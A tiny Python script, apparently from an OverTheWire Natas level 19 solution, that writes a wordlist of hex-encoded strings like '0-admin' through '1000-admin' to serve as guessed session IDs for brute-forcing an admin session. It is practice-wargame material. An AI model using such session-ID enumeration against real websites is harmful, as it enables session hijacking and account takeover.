with open('natas_19_list.txt','w') as fi:
        for i in range(1001):
                payload=f"{str(i)}-admin".encode("utf-8").hex()
                fi.write(payload+"\n")
fi.close()
